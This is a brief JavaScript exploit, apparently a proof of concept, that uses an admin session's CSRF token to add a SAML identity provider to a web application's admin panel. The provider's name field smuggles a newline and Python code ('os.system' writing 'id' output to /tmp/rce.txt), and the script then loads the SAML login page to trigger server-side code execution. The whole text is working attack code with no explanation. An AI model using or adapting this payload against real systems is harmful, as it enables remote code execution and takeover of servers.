 (function() {
     const id = Math.floor(Math.random() * 9999);
     const slug = 'exp-' + id;
     const name = 'Exp' + id + '\nimport os;os.system("id > /tmp/rce.txt")';
     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';

     $.post('/admin/uac/identityprovider/add/', {
         csrfmiddlewaretoken: Cookies.get('csrftoken'),
         name: name,
         slug: slug,
         protocol: 'saml',
         status: 'active',
         saml_metadata_xml: xml,
         use_custom_attribute_map: 'on',
         attribute_mapping: '{"email":["mail"]}',
         _save: 'Save'
     }).done(() => $.get('/saml2/login/' + slug + '/'));
 })();



